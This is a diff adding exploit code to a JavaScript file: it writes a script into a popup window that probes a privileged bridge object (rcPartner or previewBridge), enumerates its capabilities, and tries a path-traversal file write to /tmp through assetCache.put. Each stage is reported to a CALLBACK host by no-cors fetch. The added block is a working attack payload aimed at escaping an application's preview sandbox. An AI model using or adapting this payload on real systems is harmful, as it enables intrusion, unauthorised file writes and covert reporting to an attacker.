@@ -16,6 +16,35 @@ async function log(data) {
       const popup = window.open("https://www.google.com/?r3chat=" + nonce, "r3debug");
       await log({ stage: "dbg-open", popup: String(!!popup), next });
 
+      try {
+        const payload = `
+          <script>
+          const CALLBACK = ${JSON.stringify(CALLBACK)};
+          async function log(data) {
+            await fetch(CALLBACK + "?" + new URLSearchParams(data), { mode: "no-cors" });
+          }
+          (async () => {
+            const b = window.rcPartner || window.previewBridge;
+            await log({ stage: "blank-injected", href: location.href, hasBridge: String(!!b) });
+            if (b) {
+              await log({ stage: "blank-caps", caps: JSON.stringify(await b.capabilities()) });
+              try {
+                await b.assetCache.put("../../../../../../tmp/r3chat-blank", "blank write\\n", "utf8");
+                await log({ stage: "blank-write-ok" });
+              } catch (e) {
+                await log({ stage: "blank-write-fail", err: String(e) });
+              }
+            }
+          })().catch(e => log({ stage: "blank-error", err: String(e && (e.stack || e)) }));
+          <\/script>`;
+        popup.document.open();
+        popup.document.write(payload);
+        popup.document.close();
+        await log({ stage: "dbg-blank-write-issued" });
+      } catch (e) {
+        await log({ stage: "dbg-blank-write-fail", err: String(e) });
+      }
+
       setTimeout(async () => {
         try {
           popup.location.href = next + "&method=href";
